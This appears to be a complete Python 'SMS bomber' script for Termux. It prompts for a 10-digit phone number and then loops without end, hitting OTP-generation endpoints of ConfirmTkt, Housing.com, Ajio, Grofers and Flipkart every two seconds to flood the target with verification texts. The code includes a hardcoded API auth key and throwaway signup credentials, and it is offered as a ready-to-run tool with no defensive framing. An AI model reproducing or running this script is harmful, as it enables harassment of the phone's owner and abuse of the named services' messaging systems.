import os
import random
import time
import requests
import subprocess
import sys
from colorama import Fore, Style, init

init(autoreset=True)  # Initialize colorama

# Logo to be displayed
logo = """
░███████░░██░░██░░██░░░░░██
░██░░░██░░██░░██░░██░░░░░██
░███████░░██░░██░░██░░░░░██
░██░░░██░░██░░██░░██░░░░░██
░███████░░██░░██░░██████░██
"""

# Initialize the serial number counter
serial_number = 1

# Function to randomly choose a color for the logo
def random_color():
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA]
    return random.choice(colors)

# Function to clear the terminal
def clear_terminal():
    os.system('clear')  # This works on Unix-like systems (Termux)

# Function to validate mobile number
def validate_mobile_number(mobile_number):
    if len(mobile_number) == 10 and mobile_number.isdigit():
        return True
    return False

# Check if the necessary dependencies are installed
def check_dependencies():
    try:
        import requests
        import colorama
        return True
    except ImportError:
        return False

# Function to install missing dependencies
def install_dependencies():
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "colorama"])

# API call functions
def call_api_1(mobile_number):
    url = "https://securedapi.confirmtkt.com/api/platform/register"
    params = {"newOtp": "true", "mobileNumber": mobile_number}
    try:
        response = requests.get(url, params=params)
        return response.status_code == 200
    except:
        return False

def call_api_2(mobile_number):
    url = "https://login.housing.com/api/v2/send-otp"
    data = {"phone": mobile_number}
    try:
        response = requests.post(url, json=data)
        return response.status_code == 200
    except:
        return False

def call_api_3(mobile_number):
    url = "https://login.web.ajio.com/api/auth/signupSendOTP"
    data = {
        "firstName": "xxps",
        "login": "wiqpdl223@wqew.com",
        "password": "QASpw@1s",
        "genderType": "Male",
        "mobileNumber": mobile_number,
        "requestType": "SENDOTP"
    }
    try:
        response = requests.post(url, data=data)
        return response.status_code == 200
    except:
        return False

def call_api_4(mobile_number):
    url = "https://grofers.com/v2/accounts/"
    headers = {
        "auth_key": "3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept-Language": "en-US,en;q=0.9"
    }
    data = {"user_phone": mobile_number}
    try:
        response = requests.post(url, headers=headers, data=data)
        return response.status_code == 200
    except:
        return False

def call_api_5(mobile_number):
    url = "https://www.flipkart.com/api/5/user/otp/generate"
    headers = {
        "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
        "Origin": "https://www.flipkart.com",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {"loginId": f"+91{mobile_number}"}
    try:
        response = requests.post(url, headers=headers, data=data)
        return response.status_code == 200
    except:
        return False

def process_mobile_number(mobile_number):
    global serial_number
    # Sequentially call each API and show the results with colored ticks or crosses
    while True:
        print(f"{serial_number}] Calling API 1... ", end="")
        if call_api_1(mobile_number):
            print(Fore.GREEN + "✔")  # Green tick
        else:
            print(Fore.RED + "❌")  # Red cross

        serial_number += 1

        print(f"{serial_number}] Calling API 2... ", end="")
        if call_api_2(mobile_number):
            print(Fore.GREEN + "✔")
        else:
            print(Fore.RED + "❌")

        serial_number += 1

        print(f"{serial_number}] Calling API 3... ", end="")
        if call_api_3(mobile_number):
            print(Fore.GREEN + "✔")
        else:
            print(Fore.RED + "❌")

        serial_number += 1

        print(f"{serial_number}] Calling API 4... ", end="")
        if call_api_4(mobile_number):
            print(Fore.GREEN + "✔")
        else:
            print(Fore.RED + "❌")

        serial_number += 1

        print(f"{serial_number}] Calling API 5... ", end="")
        if call_api_5(mobile_number):
            print(Fore.GREEN + "✔")
        else:
            print(Fore.RED + "❌")

        serial_number += 1

        # Adding a small delay before restarting the process
        time.sleep(2)  # You can adjust the sleep time as needed

def display_logo():
    clear_terminal()  # Clear the terminal
    print(random_color() + logo)  # Display the logo with a random color
    print(Fore.WHITE + "This Script is made by Ansh, Instagram: @ansh_sx\n")  # Author info

def display_dependencies_status():
    clear_terminal()  # Clear terminal before displaying status
    print(random_color() + logo)
    print("\nChecking Dependencies... ", end="")
    if check_dependencies():
        print(Fore.GREEN + "✔ Dependencies Available")
    else:
        print(Fore.RED + "❌ Dependencies Missing, Downloading...")

if __name__ == '__main__':
    display_dependencies_status()

    # If dependencies are missing, install them
    if not check_dependencies():
        install_dependencies()
        clear_terminal()  # Clear the terminal after installation
        print(Fore.BLUE + "Dependencies Installed Successfully!")
        time.sleep(2)  # Wait for 2 seconds before restarting the script
        os.execv(sys.executable, ['python'] + sys.argv)  # Restart the script

    display_logo()

    # Mobile number input with validation
    while True:
        mobile_number = input(Fore.YELLOW + "Enter your mobile number: ")

        if validate_mobile_number(mobile_number):
            break
        else:
            print(Fore.RED + "Invalid mobile number! Please enter a 10-digit number.")

    process_mobile_number(mobile_number)
